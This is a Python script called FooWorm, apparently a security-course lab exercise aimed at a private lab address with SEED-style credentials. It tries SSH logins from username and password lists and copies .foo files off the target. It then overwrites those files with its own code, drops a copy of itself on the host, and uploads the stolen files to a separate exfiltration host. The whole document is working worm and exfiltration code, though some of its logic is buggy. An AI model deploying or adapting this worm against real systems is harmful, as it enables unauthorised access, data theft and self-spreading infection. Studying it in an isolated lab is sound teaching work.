#!/usr/bin/env python
import sys
import os
import scp
import glob
import random
import select
import signal
import paramiko


print("\nHELLO FROM FooWorm!!\n")

while True:
    usernames = ["seed"]  # Specify username for the target host **
    passwds =   ["dees"]  # Specify password for the target host **
    ipaddrs = ["192.168.56.101"]  # Specify the IP address of the target Host **

    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in ipaddrs:
                print("\nTrying password %s for user %s at IP address: %s" % (passwd,user,ip_address))
                files_of_interest_at_target = []
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address,port=22,username=user,password=passwd,timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error is not None: 
                        print(error)
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" % str(received_list))
                    if 'FooWorm' in received_list >= 0: 
                        print("\nThe target machine is already infected\n")  
                        next
                        
                    # Now let's look for files that have .foo extension
                    cmd = 'ls *.foo'
                    stdin, stdout, stderr = ssh.exec_command(cmd)
                    error = stderr.readlines()
                    if error is not None: 
                        print(error)
                        next
                    received_list = list(map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    for item in received_list:
                        files_of_interest_at_target.append(item.strip())
                    print("\nfiles of interest at the target: %s" % str(files_of_interest_at_target))
                    scpcon = scp.SCPClient(ssh.get_transport())
                    if len(files_of_interest_at_target) > 0:
                        for target_file in files_of_interest_at_target:
                            scpcon.get(target_file)
                    IN = open(sys.argv[0], 'r')
                    virus = [line for (i,line) in enumerate(IN) if i < 100]
                    TAR = open(target_file, 'r')
                    all_of_it = TAR.readlines()
                    TAR.close()
                    if any(line.find('foovirus') for line in all_of_it): next
                    os.chmod(target_file, 0o777)    
                    OUT = open(target_file, 'w')
                    OUT.writelines(virus)
                    all_of_it = ['#' + line for line in all_of_it]
                    OUT.writelines(all_of_it)
                    OUT.close()
                        # Now deposit a copy of FooWorm.py at the target host:
                    scpcon.put(sys.argv[0])              
                    scpcon.close()
                except:
                    next
                # Now upload the exfiltrated files to a specially designated host,
                # which can be a previously infected host.  The worm will only 
                # use those previously infected hosts as destinations for 
                # exfiltrated files if it was able to send the login credentials
                # used on those hosts to its human masters through, say, a 
                # secret IRC channel. (See Lecture 29 on IRC)
                if len(files_of_interest_at_target) > 0:
                    print("\nWill now try to exfiltrate the files")
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        #  For exfiltration demo to work, you must provide an IP address and the login 
                        #  credentials in the next statement:
                        ssh.connect('192.168.56.101',port=22,username='seed',password='dees',timeout=5) # Add your victim's IP address,username and password **
                        scpcon = scp.SCPClient(ssh.get_transport())
                        print("\nConnected to exfiltration host\n")
                        for filename in files_of_interest_at_target:
                            scpcon.put(filename)
                        scpcon.close()
                    except: 
                        print("No uploading of exfiltrated files\n")
                        next
    break
